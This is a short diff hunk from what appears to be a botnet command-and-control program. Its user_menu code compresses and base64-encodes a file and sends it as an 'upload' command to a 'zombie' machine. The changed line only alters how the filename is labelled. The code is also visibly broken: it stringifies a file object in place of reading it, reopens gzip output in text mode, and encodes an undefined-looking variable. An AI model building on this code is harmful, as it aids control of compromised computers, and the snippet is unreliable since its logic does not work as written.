@@ -260,7 +260,7 @@ def user_menu():
                                                         with gzip.open((filename+".gz"),"wb") as out_file:
                                                                 out_file.write(in_file.read().encode('utf-8'))
                                                 filedata = str(open((filename+".gz"),"r"))
-                                                cmdcode = filename+".gz#data#"+filedata
+                                                cmdcode = filename+"#data#"+filedata
                                                 cmdcode = base64.b64encode(cmdmsg.encode('utf-8')).decode()
                                                 command = {"type":"upload","cmd":cmdcode,"get_result":True,"background":False}
                                                 msg = format_msg("server",zombie,command,False,False)
